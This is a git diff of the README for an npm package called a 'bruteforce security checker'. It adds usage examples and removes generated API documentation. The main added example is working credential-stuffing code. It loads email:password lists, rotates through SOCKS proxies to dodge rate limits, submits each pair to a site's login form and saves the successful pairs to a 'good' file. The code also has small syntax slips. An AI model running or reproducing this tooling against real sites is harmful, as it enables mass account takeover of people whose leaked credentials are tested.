@@ -9,61 +9,152 @@ Examples of usage in **/examples** directory
 
 ## Table of contents
 
-- [Bruteforce setup](#bruteforce_setup)
-- [Bruteforce example](#bruteforce_examples)
+- [Installation](#installation)
+- [Documentation](#documentation)
+- [Bruteforce](#bruteforce)
 - [Service](#service)
-- [Service example](#service_examples)
-
+- [Examples](#examples)
 ---
 
-## Bruteforce setup
+## Installation
+```npm i @k7eon/bruteforce-security-checker --save```
 
-Require module:
+## Documentation
+For methods documentation visit [Doxdox generated docs](https://doxdox.org/k7eon/bruteforce-security-checker)
+
+---------------------------------
+# BruteForce
+include:
 ```js
 const b = require('@k7eon/bruteforce-security-checker').bruteforce;
+// or
+const {bruteforce} = require('@k7eon/bruteforce-security-checker');
 ```
 
-Create metrics object like counter to monitor custom metrics
+---------------------------------
+# Service class
+Service is a class with some usefully methods
+
+include:
 ```js
-setMetrics(['loggedIn', 'captcha']);
+const Service = require('@k7eon/bruteforce-security-checker').Service;
+// or
+const {Service} = require('@k7eon/bruteforce-security-checker');
 ```
 
-Start showing metrics in console. Argument is interval in ms
+---------------------------------
+## Examples
+
+---------------------------------
+#### Example of *Service* usage
 ```js
-startShowingMetrics(10*1000);
+  // MySiteClass.js
+  class MySiteClass extends Service {
+    
+    /**
+    * if login success return cookies or null or throw HTTP layer exception;
+    * @param login
+    * @param password
+    * @param agent      - socks proxy agent
+    * @return {Promise<*>}
+    */
+    async login(login, password, agent=null) {
+      
+      let config = {
+        method: 'POST',
+        url: 'http://mysite.com/login',
+        headers: {
+          'accept':           'application/json, text/javascript, */*; q=0.01',
+          'accept-language':  'en-US,en;q=0.5',
+          'content-type':     'application/x-www-form-urlencoded; charset=UTF-8',
+          'origin':           'http://mysite.com',
+          'referer':          'http://mysite.com/login',
+          'user-agent':       'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 YaBrowser/18.1.1.835 Yowser/2.5 Safari/537.36',
+          'x-requested-with': 'XMLHttpRequest',
+        },
+        form: {
+          'username': login,
+          'password': password,
+        },
+        json: true,
+      } // like 'request/request' lib
+      let {response, body} = this.r(config, agent);
+      
+      if (!body.success) return null;
+      let logCookies = this.getSetCookies(response);
+      return logCookies;
+    }
+  }
+  module.exports = new MySiteClass();
 ```
+More about request configs [there](https://github.com/request/request)
 
-Create not exist files
+
+---------------------------------
+#### Example of *Bruteforce* with *MySiteClass*
 ```js
-createFilesIfNotExists({loggedIn: './loggedIn.log'});
+const fs     = require('fs');
+const b      = require('@k7eon/bruteforce-security-checker').bruteforce;
+const mySite = require('./MySiteClass');
+const FILE = {
+  proxies:      'files/proxy_valid.txt',
+  registered:   'files/registered.log',
+  bad:          'files/bad.log',
+  good:         'files/good.log',
+  errors:       'files/errors_login.log',
+};
+
+b.createFilesIfNotExists(FILE);
+b.loadRegisteredAccounts(FILE.registered);
+b.removeAccountsFrom('email', FILE.bad);
+b.loadProxyAgents(FILE.proxies);
+
+b.setMetrics({'good':0, 'bad':0})
+b.startShowingMetrics(10000);
+
+b.start({
+  THREADS:      1,
+  whatToQueue:  'accounts',
+  useProxy:     true,
+  handlerFunc: async (task, agent) => {
+    let account = task;
+    console.log('account', account);
+    let {email, password} = account;
+
+    try {
+      let cookie = await mySite.login(email, password, agent);
+
+      if (!cookie) {
+        console.log('bad');
+        fs.appendFileSync(FILE.bad, email+'\n');
+        b.metrics.bad++;
+        return {agent};
+      }
+      if (cookie) {
+        console.log('good');
+        fs.appendFileSync(FILE.good, `${[email, password].join(':')]}\n`);
+        b.metrics.good++;
+        return {agent};
+      }
+    } catch (e) {
+      console.log('error', e);
+      brute.queue.push(account);  // recheck account
+      fs.appendFileSync(FILE.errors, `${JSON.stringify({account, proxy: agent.options.host})}\n${e.stack}\n\n`);
+      return {agent};
+    }
+  },
+  drainCallback: () => {
+    console.log('All accounts are checked');
+  }
+});
 ```
 
-Load file, split to lines and return [{email, password}]
-
-Example of expected line: email@email.com:password1
-
-if (getLogin=true) retrieve login from email
-
-after execute they update this.accounts
-```js
-loadAccounts('accounts.txt', getLogin=false);
-```
-
-Expect lines in file like this **someLogin::email@e.co:pass1**
-```js
-loadRegisteredAccounts('accounts.txt');
-```
-
-
-```js
-removeAccountsFrom('accounts.txt');
-```
-
-
-### Basic usage {bruteforce}:
-- ```npm i @k7eon/bruteforce-security-checker --save```
+---------------------------------
+#### Bruteforce proxy checker example
 - Create proxy_checker.js and put content below:
 ```js
+const request = require('request');
+const rp = require('request-promise');
 const brute = require('@k7eon/bruteforce-security-checker').bruteforce;
 const FILE = {
   proxies:        'files/proxy.txt',
@@ -106,388 +197,6 @@ brute.start({
   }
 });
 ```
-- Create directory 'files'
-- ```node proxy_checker.js```
-
-// todo basic usage {Service}
-
-
----------------------------------
-# BruteForce
-usage:
-```js
-  const b = require('@k7eon/bruteforce-security-checker').bruteforce;
-  or
-  const {bruteforce} = require('@k7eon/bruteforce-security-checker');
-```
-
-
-# [@k7eon/bruteforce-security-checker](https://github.com/k7eon/bruteforce-security-checker#readme) *1.0.13*
-
-
-
-### modules/bruteforce.js
-
-
-#### setMetrics(metrics) 
-
-Create metrics object like counter to monitor custom metrics
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| metrics |  | Array of string like ['good', 'bad'] | &nbsp; |
-
-
-
-
-##### Returns
-
-
-- `Void`
-
-
-
-#### startShowingMetrics(interval) 
-
-start interval showing metrics
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| interval |  | ms, interval of console.log | &nbsp; |
-
-
-
-
-##### Returns
-
-
-- `Void`
-
-
-
-#### createFilesIfNotExists(filesObj) 
-
-Creates files if they are not exists
-But directories must be created by hand
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| filesObj | `object`  | like {loggedIn: './loggedIn.log'} | &nbsp; |
-
-
-
-
-##### Returns
-
-
-- `Void`
-
-
-
-#### loadAccounts(path, getLogin&#x3D;false) 
-
-// todo universalize
-parse lines from file and load account to check
-example of line in file: email@e.mail:mypass
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| path | `string`  |  | &nbsp; |
-| getLogin&#x3D;false | `boolean`  | need to retrieve login from email, is it? | &nbsp; |
-
-
-
-
-##### Returns
-
-
-- `Array`  like {email, password}[]
-
-
-
-#### loadRegisteredAccounts({string path) 
-
-// todo universalize
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| {string path |  |  | &nbsp; |
-
-
-
-
-##### Returns
-
-
-- `Array`  like {login, email, password}[]
-
-
-
-#### removeAccountsFrom(by, path) 
-
-Remove all lines from this.accounts that includes 'email' attr in 'path' file
-Update this.accounts
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| by | `string`  | any attribute from this.accounts[0] | &nbsp; |
-| path | `string`  | path to file whose lines must be removed from this.accounts | &nbsp; |
-
-
-
-
-##### Returns
-
-
-- `Array`  
-
-
-
-#### loadProxies(path) 
-
-todo http proxy support
-File contain lines like: "128.12.1.1:1080"
-Update this.proxies
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| path | `string`  |  | &nbsp; |
-
-
-
-
-##### Returns
-
-
-- `Array`  
-
-
-
-#### loadProxyAgents(path) 
-
-todo http proxy support
-Loading  proxies and generate this.agents whose are used in http request options
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| path | `string`  |  | &nbsp; |
-
-
-
-
-##### Returns
-
-
-- `Array`  
-
-
-
-#### queueLeft() 
-
-Return count of left work in queue
-
-
-
-
-
-
-##### Returns
-
-
-- `number`  
-
-
-
-#### getAgent() 
-
-this.agents.shift()
-
-
-
-
-
-
-##### Returns
-
-
-- `Agent`  
-
-
-
-#### returnAgent(agent, timeout) 
-
-push(agent) after 'timeout'
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| agent | `Agent`  |  | &nbsp; |
-| timeout | `number`  |  | &nbsp; |
-
-
-
-
-##### Returns
-
-
--  
-
-
-
-#### start(opts) 
-
-Start processing
-handlerFunc example: async (task,agent)=>{ try/catch, return {agent?} }. if return {agent} then will call this.returnAgent
-
-opts = {
-  {integer}    THREADS         threads amount
-  {function}   handlerFunc     required.
-  {string}     whatToQueue     from this. context. ('accounts' or 'agents')
-  {string}     startMessage    this will print on bruteforce start checking
-  {string}     drainMessage    this will print when all tasks are processed
-  {function}   drainCallback   required. Callback when all tasks are processed
-  {boolean}    useProxy
-}
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| opts | `object`  |  | &nbsp; |
-
-
-
-
-##### Returns
-
-
-- `true`  
-
-
-
-#### timeout(ms) 
-
-Async timeout implementation
-Usage: await this.timeout(5000)
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| ms | `number`  |  | &nbsp; |
-
-
-
-
-##### Returns
-
-
-- `Promise.&lt;any&gt;`  
-
-
-
-
-### modules/service.js
-
-
-#### getSetCookies(rResponse) 
-
-retrieve 'set-cookie' header from 'request'.response
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| rResponse |  |  | &nbsp; |
-
-
-
-
-##### Returns
-
-
--  
-
-
-
-#### parse(source, start, end) 
-
-Retrieve sub string by passing 'start' and 'end' substring
-example: parse('123baaz321', '123', '321') will return 'baaz'
-
-
-
-
-##### Parameters
-
-| Name | Type | Description |  |
-| ---- | ---- | ----------- | -------- |
-| source | `string`  | source string | &nbsp; |
-| start | `string`  | start substring | &nbsp; |
-| end | `string`  | end substring | &nbsp; |
-
-
-
-
-##### Returns
-
-
-- `string`  
-
-
-
-
-*Documentation generated with [doxdox](https://github.com/neogeek/doxdox).*
+- Create directory **files**
+- Put some proxies in **files/proxy.txt**
+- Run ```node proxy_checker.js```
